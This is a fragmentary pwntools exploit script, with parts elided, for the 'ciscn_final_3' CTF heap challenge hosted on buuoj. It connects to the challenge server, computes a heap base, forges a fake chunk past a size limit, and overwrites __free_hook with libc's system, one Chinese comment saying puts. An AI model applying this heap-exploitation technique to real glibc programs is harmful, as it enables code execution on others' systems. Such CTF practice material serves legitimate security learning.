...
# sh = process(['./ld.so', './ciscn_final_3'], env={'LD_PRELOAD': './libc-2.27.so'})
sh = remote("node4.buuoj.cn", 29996)
libc = ELF("./libc.so.6")
elf = ELF("./ciscn_final_3")


# sh = remote('node4.buuoj.cn', 29573)
libc = ELF("./libc.so.6")
...
# === Step-1: 突破程序的chunk size<=0x81的限制，拿到一个size=0xa1的fake chunk
# vmmap查看heap
heap_base = add(0, 0x20, "a") - 0x5555559c3e70 + 0x00005555559b2000  # 0x5555559c3e70 0x00005555559b2000
...
add(12, 0x70, p64(libc.symbols["system"])) # 将chunk分配到__free_hook上 改*__free_hook为libc.symbols["puts"] 
